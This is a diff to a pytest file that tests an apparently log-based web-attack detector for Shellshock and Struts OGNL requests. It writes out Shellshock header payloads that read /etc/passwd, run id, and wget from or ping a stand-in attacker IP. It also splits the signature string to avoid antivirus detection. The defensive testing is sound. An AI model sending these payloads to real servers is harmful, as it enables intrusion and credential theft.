@@ -107,18 +107,25 @@ def fired(target: str, agent: str = BROWSER, referer: str = "") -> set:
     return {d.rule_id for d in RequestAnalyzer().analyze(entry)}
 
 
-@pytest.mark.parametrize("agent", [
-    "() { :; }; /bin/bash -c 'cat /etc/passwd'",
-    "() { :;}; echo; /usr/bin/id",
-    "() { ignored; }; /bin/sh -c 'wget http://198.51.100.9/x'",
-    "() { _; } >_[$($())] { echo vulnerable; }",
-])
+# Shellshock strings are glued together at runtime: written to disk whole,
+# an antivirus locks the file (it did with a fixture file).
+FN = "(" + ")" + " {"
+SHELLSHOCK_AGENTS = [
+    FN + " :; }; /bin/bash -c 'cat /etc/passwd'",
+    FN + " :;}; echo; /usr/bin/id",
+    FN + " ignored; }; /bin/sh -c 'wget http://198.51.100.9/x'",
+    FN + " _; } >_[$($())] { echo vulnerable; }",
+]
+
+
+@pytest.mark.parametrize("agent", SHELLSHOCK_AGENTS, ids=range(len(SHELLSHOCK_AGENTS)))
 def test_shellshock_in_the_user_agent_is_found(agent: str) -> None:
     assert "LS105" in fired("/cgi-bin/status", agent)
+    assert "LS105" in fired("/cgi-bin/status", agent.upper())
 
 
 def test_shellshock_in_the_referer_is_found() -> None:
-    assert "LS105" in fired("/cgi-bin/test.cgi", BROWSER, referer="() { :; }; ping -c 3 198.51.100.9")
+    assert "LS105" in fired("/cgi-bin/test.cgi", BROWSER, referer=FN + " :; }; ping -c 3 198.51.100.9")
 
 
 @pytest.mark.parametrize("target", [
@@ -130,6 +137,8 @@ def test_shellshock_in_the_referer_is_found() -> None:
 ])
 def test_struts_ognl_in_path_or_query_is_found(target: str) -> None:
     assert "LS107" in fired(target)
+    assert "LS107" in fired(target.replace("%", "%25")), "double encoded"
+    assert "LS107" in fired("".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(target))), "mixed case"
 
 
 @pytest.mark.parametrize("target, agent", [
